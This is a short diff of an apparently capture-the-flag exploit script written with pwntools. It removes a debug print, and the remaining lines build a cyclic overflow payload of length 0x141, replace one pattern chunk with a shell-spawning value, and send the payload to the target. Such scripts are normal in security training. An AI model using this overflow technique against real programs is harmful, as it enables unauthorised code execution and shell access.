@@ -30,9 +30,7 @@ else:
 # END SETUP BOILERPLATE
 # BEGIN CHALLENGE-SPECIFIC CODE
 
-print(buffer_address)
 max_len = 0x141
-
 
 payload = cyclic(max_len).replace(b"ajaa", get_a_shell)
 io.sendline(payload)
